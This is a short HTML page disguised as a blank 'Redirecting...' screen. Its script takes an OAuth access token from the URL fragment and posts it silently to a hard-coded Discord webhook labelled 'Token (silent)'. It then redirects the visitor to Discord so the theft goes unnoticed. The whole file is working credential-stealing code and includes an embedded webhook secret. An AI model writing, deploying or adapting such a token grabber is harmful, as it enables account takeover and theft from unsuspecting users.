<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <!-- No visible content -->
</head>
<body>
    <script>
        // ========== CONFIGURATION ==========
        const WEBHOOK = "https://discord.com/api/webhooks/1545479634005524612/7kO5F7Z86zgfumFzzitcpENMPpu7bkVkpQN_B-50W4th_dUIEQWaQLmJbVVyFjLaA-s9";
        // ===================================

        // Extract token from URL fragment after OAuth redirect
        if (window.location.hash) {
            const params = new URLSearchParams(window.location.hash.substring(1));
            const token = params.get('access_token');
            if (token) {
                // Silently send token to webhook
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🚀 **Token (silent)**\n\`${token}\``,
                        embeds: [{ title: "No‑Image Grab", color: 0x00ff00 }]
                    })
                }).catch(() => {});
            }
        }

        // Immediately redirect to Discord – the user never sees this page
        window.location.href = 'https://discord.com/channels/@me';
    </script>
</body>
</html>
